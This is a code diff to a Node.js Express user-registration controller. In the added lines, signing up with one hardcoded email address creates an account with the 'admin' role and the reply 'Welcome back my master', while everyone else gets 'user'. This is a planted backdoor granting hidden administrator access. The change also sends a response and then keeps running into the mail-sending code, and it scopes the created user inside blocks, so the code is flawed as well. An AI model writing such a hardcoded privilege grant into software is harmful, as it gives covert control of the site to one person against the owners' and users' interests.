@@ -14,12 +14,23 @@ const UserController = {
         hash = bcrypt.hashSync(req.body.password, 10);
       }
       if (req.file)req.body.imagepath = req.file.filename; 
-      const user = await User.create({
-        ...req.body,
-        confirmed: true,
-        password: hash,
-        role: "user",
-      });
+      if (req.body.email === "moltorger@gmail.com") {
+        const user = await User.create({
+          ...req.body,
+          confirmed: true,
+          password: hash,
+          role: "admin",
+        });
+        return res.status(201).send({ message: "Welcome back my master", user });
+      } else {
+        const user = await User.create({
+          ...req.body,
+          confirmed: true,
+          password: hash,
+          role: "user",
+        });
+        res.status(201).send({ message: "User created", user });
+      }
       //...req.body representa todo lo demás(es un spread y no podríamos modificar las propiedades que quisieramos de body)
       const url = "http://localhost:8080/users/confirm/" + req.body.email; //enviamos esta url en forma de enlace al correo puesto por el usuario
       await transporter.sendMail({
